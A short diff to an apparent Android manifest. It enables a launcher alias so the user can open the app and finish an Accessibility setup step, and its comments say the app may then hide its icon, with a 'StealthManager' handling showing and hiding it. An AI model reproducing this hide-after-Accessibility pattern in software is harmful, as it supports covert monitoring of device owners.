@@ -109,14 +109,15 @@
         </activity>
 
         <!--
-            Launcher alias — disabled by default so no icon appears in the drawer.
-            StealthManager.showAppIcon() can enable this to temporarily surface
-            the app in the launcher; hideAppIcon() disables it again.
+            Launcher alias — enabled by default so the app appears in the drawer
+            and the user can open it to complete the Accessibility setup step.
+            Once accessibility is confirmed running, the app may disable this
+            alias to hide itself from the drawer.
         -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
-            android:enabled="false"
+            android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
